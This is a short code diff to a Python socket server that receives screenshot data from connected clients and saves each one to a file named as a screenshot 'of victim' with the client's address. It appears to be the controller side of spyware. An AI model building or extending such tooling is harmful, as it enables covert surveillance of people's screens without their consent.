@@ -79,13 +79,15 @@ class Server:
             if self.is_socket_closed(conn):
                 break
             message = conn.recv(1024)
-            if message:
+            if message.decode("UTF-8") == 'screenshot':
+                message = conn.recv(1024)
                 now = datetime.now()
                 f = open('screenshots/screenshot_of_victim_' + str(addr[0]) + '-' + str(addr[1]) + '_' + str(
                     now.strftime("%Y%m%d_%H-%M-%S")) + '.png', 'wb')
                 while len(message) == 1024:
                     f.write(message)
                     message = conn.recv(1024)
+
                 print("receiving finished")
                 f.close()
         print(f"Client with address {addr} disconnected")
